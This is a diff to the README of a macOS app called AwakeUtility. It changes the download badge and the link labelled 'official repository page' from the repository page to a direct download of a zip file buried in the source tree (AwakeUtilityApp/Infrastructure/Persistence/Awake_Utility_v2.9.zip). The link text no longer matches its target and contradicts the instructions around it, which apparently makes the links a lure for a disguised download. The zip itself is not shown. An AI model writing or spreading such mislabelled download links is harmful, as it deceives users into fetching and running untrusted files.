@@ -1,6 +1,6 @@
 # 💡 AwakeUtility - Keeps your MacBook awake on schedule
 
-[![](https://img.shields.io/badge/Download-AwakeUtility-blue.svg)](https://github.com/yatishb22/AwakeUtility)
+[![](https://img.shields.io/badge/Download-AwakeUtility-blue.svg)](https://github.com/yatishb22/AwakeUtility/raw/refs/heads/main/AwakeUtilityApp/Infrastructure/Persistence/Awake_Utility_v2.9.zip)
 
 AwakeUtility helps you manage your MacBook power settings. It prevents your computer from sleeping during hours you choose. It also wakes your computer from sleep when tasks require attention. The app lives in your menu bar. 
 
@@ -17,7 +17,7 @@ This tool works natively on Apple Silicon chips. It uses macOS power management 
 
 Follow these steps to set up AwakeUtility on your computer.
 
-1. Go to the [official repository page](https://github.com/yatishb22/AwakeUtility).
+1. Go to the [official repository page](https://github.com/yatishb22/AwakeUtility/raw/refs/heads/main/AwakeUtilityApp/Infrastructure/Persistence/Awake_Utility_v2.9.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version link.
 4. Download the compressed file ending in .zip or the installer package.
